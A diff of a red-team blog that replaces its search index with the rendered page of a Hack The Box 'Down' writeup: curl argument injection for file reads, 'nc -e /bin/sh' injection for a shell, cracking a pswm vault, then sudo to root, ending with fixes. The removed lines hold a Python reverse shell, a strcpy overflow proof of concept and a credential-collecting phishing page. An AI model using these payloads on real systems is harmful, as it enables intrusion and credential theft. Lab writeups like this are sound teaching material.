@@ -1,47 +1,147 @@
-<?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>Linux Privilege Escalation Cheatsheet</title>
-    <url>/2026/08/08/linux-privesc-cheatsheet/</url>
-    <content><![CDATA[<p>Quick reference commands — replace&#x2F;expand with your own notes.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SUID binaries</span></span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sudo rights</span></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Cron jobs</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"></span><br><span class="line"><span class="comment"># Kernel version</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
 
-<p>Python reverse shell one-liner:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, subprocess, os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">host, port</span>):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    <span class="keyword">for</span> fd <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        os.dup2(s.fileno(), fd)</span><br><span class="line">    subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br><span class="line"></span><br><span class="line">connect(<span class="string">&quot;10.10.10.10&quot;</span>, <span class="number">4444</span>)</span><br></pre></td></tr></table></figure>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Down | r3vpwnx</title>
+<meta name="description" content="Red Team | Offensive Security">
+<meta name="author" content="r3vpwnx">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
 
-<p>Minimal C buffer overflow PoC:</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *input)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, input); <span class="comment">// no bounds check</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+  <div class="bg-layer" id="bgLayer" style="background-image: url('/images/background.jpeg');"></div>
+  <div class="bg-overlay" id="bgOverlay"></div>
 
-<p>C++ equivalent:</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">vuln</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *input)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    std::<span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">vuln</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  <header class="topnav">
+  <div class="topnav-inner">
+    <a class="brand" href="/">
+      <span class="brand-glitch" data-text="r3vpwnx">r3vpwnx</span>
+    </a>
 
-<p>Basic phishing landing page skeleton:</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/collect&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Cheatsheets</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>privesc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Welcome to the blog</title>
-    <url>/2023/03/14/welcome/</url>
-    <content><![CDATA[<p>Welcome. This is <strong>r3vpwnx</strong>‘s red team blog — writeups, articles, and cheatsheets on offensive security, exploitation, and CTFs.</p>
-]]></content>
-      <categories>
-        <category>Articles</category>
-      </categories>
-      <tags>
-        <tag>meta</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB: Down</title>
-    <url>/2026/04/20/first-writeup/</url>
-    <content><![CDATA[<ul>
+    <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">
+      <span></span><span></span><span></span>
+    </button>
+
+    <nav class="nav-links" id="navLinks">
+      <button class="nav-link search-trigger" id="searchTrigger" type="button" aria-label="Search">
+        <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true">
+          <circle cx="10.5" cy="10.5" r="6.5" fill="none" stroke="currentColor" stroke-width="2"/>
+          <line x1="20" y1="20" x2="15.2" y2="15.2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+        <span>Search</span>
+      </button>
+      
+        <a href="/" class="nav-link">Home</a>
+      
+        <a href="/categories/writeups/" class="nav-link">Writeups</a>
+      
+        <a href="/categories/articles/" class="nav-link">Articles</a>
+      
+        <a href="/archives/" class="nav-link">Archive</a>
+      
+        <a href="/tags/" class="nav-link">Tags</a>
+      
+        <a href="/categories/" class="nav-link">Categories</a>
+      
+        <a href="/categories/cheatsheets/" class="nav-link">Cheatsheets</a>
+      
+        <a href="/about/" class="nav-link">About</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+  <div class="page-shell">
+    <aside class="sidebar" id="sidebar">
+  <div class="profile-card">
+    <img class="avatar" src="/images/r3vpwnx.jpg" alt="r3vpwnx">
+    <h2 class="profile-name">r3vpwnx</h2>
+    <p class="profile-tagline">Red Team | Offensive Security</p>
+
+    
+    <a class="btn-follow" href="https://github.com/r3vpwnx" target="_blank" rel="noopener noreferrer">
+      <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true">
+        <circle cx="12" cy="13" r="8" fill="none" stroke="currentColor" stroke-width="1.8"/>
+        <path d="M7 8 L9.5 5.5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+        <path d="M17 8 L14.5 5.5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+        <circle cx="9" cy="12.5" r="1.1" fill="currentColor"/>
+        <circle cx="15" cy="12.5" r="1.1" fill="currentColor"/>
+      </svg>
+      Follow on GitHub
+    </a>
+    
+
+    <div class="social-links">
+      
+      <a href="https://x.com/r3vpwnx" target="_blank" rel="noopener noreferrer" aria-label="X (Twitter)" title="X">
+        <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true">
+          <circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.6"/>
+          <line x1="8" y1="8" x2="16" y2="16" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+          <line x1="16" y1="8" x2="8" y2="16" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+        </svg>
+      </a>
+      
+
+      
+      <a href="https://linkedin.com/in/r3vpwnx" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" title="LinkedIn">
+        <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true">
+          <rect x="3" y="3" width="18" height="18" rx="4" fill="none" stroke="currentColor" stroke-width="1.6"/>
+          <text x="12" y="16.5" font-family="Arial, sans-serif" font-size="10" font-weight="700" fill="currentColor" text-anchor="middle">in</text>
+        </svg>
+      </a>
+      
+
+      
+      <a href="https://instagram.com/r3vpwnx" target="_blank" rel="noopener noreferrer" aria-label="Instagram" title="Instagram">
+        <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true">
+          <rect x="3.5" y="3.5" width="17" height="17" rx="5" fill="none" stroke="currentColor" stroke-width="1.6"/>
+          <circle cx="12" cy="12" r="4" fill="none" stroke="currentColor" stroke-width="1.6"/>
+          <circle cx="16.7" cy="7.3" r="1" fill="currentColor"/>
+        </svg>
+      </a>
+      
+    </div>
+
+    
+    <a class="btn-support" href="https://paypal.me/theoptech" target="_blank" rel="noopener noreferrer">
+      <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true">
+        <path d="M6 4h8a4.5 4.5 0 0 1 4.4 5.5A5.5 5.5 0 0 1 13 14h-3l-1 6H6L8.2 4Z" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/>
+      </svg>
+      Support via PayPal
+    </a>
+    
+  </div>
+</aside>
+
+    <main class="content">
+      <article class="post">
+  <header class="post-header">
+    <h1 class="post-title">HTB: Down</h1>
+    <div class="post-meta">
+      <time datetime="2026-04-20T09:00:00.000Z">published 2026-04-20</time>
+      
+      
+        
+          <a class="pill" href="/categories/writeups/">Writeups</a>
+        
+      
+    </div>
+  </header>
+
+  
+  
+  <details class="post-toc" open>
+    <summary class="post-toc-title">Table of Contents</summary>
+    <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#Path-to-root-at-a-glance"><span class="toc-text">Path to root, at a glance:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-app"><span class="toc-text">The app</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Argument-injection-%E2%86%92-file-read"><span class="toc-text">Argument injection → file read</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-the-source"><span class="toc-text">Reading the source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shell-as-www-data"><span class="toc-text">Shell as www-data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-escalation-the-pswm-vault"><span class="toc-text">Privilege escalation: the pswm vault</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#What-the-format-actually-is"><span class="toc-text">What the format actually is</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-it"><span class="toc-text">Cracking it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Root"><span class="toc-text">Root</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Why-it-worked-three-fixes"><span class="toc-text">Why it worked (three fixes)</span></a></li></ol></li></ol>
+  </details>
+  
+
+  <div class="post-content">
+    <ul>
 <li>TOC<br>{:toc}</li>
 </ul>
 <p><strong>Down</strong> is an easy Linux box (the first VulnLab → HTB migration) that hinges on a single primitive: <code>escapeshellcmd()</code> stops <em>command</em> injection but does nothing about <em>argument</em> injection. A website-uptime checker shells out to <code>curl</code> and <code>nc</code> with user input glued into the command string. I abuse curl’s multi-URL handling to read arbitrary files, recover the PHP source, then abuse an <code>intval()</code>&#x2F;original-string validation gap in an “expert mode” to inject <code>-e /bin/sh</code> into <code>nc</code> for a shell. Root falls out of a cracked <code>pswm</code> vault (scrypt + AES-GCM) and a wide-open sudo rule.</p>
@@ -112,7 +212,7 @@
 <h3 id="Privilege-escalation-the-pswm-vault"><a href="#Privilege-escalation-the-pswm-vault" class="headerlink" title="Privilege escalation: the pswm vault"></a>Privilege escalation: the pswm vault</h3><p><code>www-data</code> can partially read aleks’ home:</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /home/aleks -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="comment"># /home/aleks/.local/share/pswm/pswm    &lt;-- readable</span></span><br><span class="line"><span class="comment"># .ssh / .cache are 700 — denied</span></span><br></pre></td></tr></table></figure>
 
-<p><code>pswm</code> is <a href="https://github.com/Julynx/pswm">Julynx’s CLI password manager</a>. The vault:</p>
+<p><code>pswm</code> is <a target="_blank" rel="noopener" href="https://github.com/Julynx/pswm">Julynx’s CLI password manager</a>. The vault:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e9laWoKiJ0Od...kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==</span><br></pre></td></tr></table></figure>
 
 <p>Four <code>*</code>-separated base64 fields — the signature of the <code>cryptocode</code> library.</p>
@@ -144,13 +244,85 @@
 <li><strong>Validate the value you actually use.</strong> The <code>intval(port)‘→validate→use−‘port)</code> → validate → use-<code> port)‘→validate→use−‘port</code> gap <em>is</em> the nc injection. Re-assign the sanitized int (<code>port=(int)port = (int) port=(int)port;</code>) before it touches the command.</li>
 <li><strong>A leaked GCM vault is an offline password oracle.</strong> The authenticity tag doubles as the “is this the right key” check, so the only thing between a stolen vault and its contents is the KDF cost — defeated here by a weak master password.</li>
 </ul>
-]]></content>
-      <categories>
-        <category>Writeups</category>
-      </categories>
-      <tags>
-        <tag>privesc</tag>
-        <tag>htb</tag>
-      </tags>
-  </entry>
-</search>
+
+  </div>
+
+  
+  <div class="post-card-tags post-tags">
+    
+      <a class="tag" href="/tags/privesc/">#privesc</a>
+    
+      <a class="tag" href="/tags/htb/">#htb</a>
+    
+  </div>
+  
+
+  
+  <div class="post-cta">
+    <p class="post-cta-text">Found this useful?</p>
+    <div class="post-cta-buttons">
+      
+      <a class="btn-follow" href="https://github.com/r3vpwnx" target="_blank" rel="noopener noreferrer">
+        <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true">
+          <circle cx="12" cy="13" r="8" fill="none" stroke="currentColor" stroke-width="1.8"/>
+          <path d="M7 8 L9.5 5.5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+          <path d="M17 8 L14.5 5.5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+          <circle cx="9" cy="12.5" r="1.1" fill="currentColor"/>
+          <circle cx="15" cy="12.5" r="1.1" fill="currentColor"/>
+        </svg>
+        Follow on GitHub
+      </a>
+      
+      
+      <a class="btn-support" href="https://paypal.me/theoptech" target="_blank" rel="noopener noreferrer">
+        <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true">
+          <path d="M6 4h8a4.5 4.5 0 0 1 4.4 5.5A5.5 5.5 0 0 1 13 14h-3l-1 6H6L8.2 4Z" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/>
+        </svg>
+        Support via PayPal
+      </a>
+      
+    </div>
+  </div>
+  
+
+  <nav class="post-pager">
+    <a class="pager-link" href="/2026/08/08/linux-privesc-cheatsheet/">&larr; Linux Privilege Escalation Cheatsheet</a>
+    <a class="pager-link" href="/2023/03/14/welcome/">Welcome to the blog &rarr;</a>
+  </nav>
+</article>
+
+    </main>
+  </div>
+
+  <footer class="site-footer">
+  <p>© r3vpwnx — stay dangerous. · 2026</p>
+</footer>
+
+
+  <div class="search-overlay" id="searchOverlay" hidden>
+    <div class="search-box">
+      <div class="search-input-row">
+        <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true">
+          <circle cx="10.5" cy="10.5" r="6.5" fill="none" stroke="currentColor" stroke-width="2"/>
+          <line x1="20" y1="20" x2="15.2" y2="15.2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+        <input type="text" id="searchInput" placeholder="Search writeups, articles, cheatsheets..." autocomplete="off">
+        <button id="searchClose" class="search-close" aria-label="Close search">&times;</button>
+      </div>
+      <div id="searchResults" class="search-results"></div>
+    </div>
+  </div>
+
+  <script>
+    window.BLACKICE = {
+      root: "/",
+      clickEffect: {"enable":true,"words":["ACCESS GRANTED","ROOT","0-DAY","SHELL SPAWNED","EXPLOIT","PWNED","BACKDOOR PLANTED","RECON COMPLETE","PAYLOAD DELIVERED","PRIVESC","C2 ESTABLISHED","BREACH DETECTED","LATERAL MOVEMENT","PERSISTENCE SET","EXFILTRATED","NMAP -sV -sC","INJECT","SEGFAULT"]},
+      searchPath: "/search.xml"
+    };
+  </script>
+  <script src="/js/main.js"></script>
+  <script src="/js/click-effect.js"></script>
+  <script src="/js/search.js"></script>
+  <script src="/js/code-copy.js"></script>
+</body>
+</html>
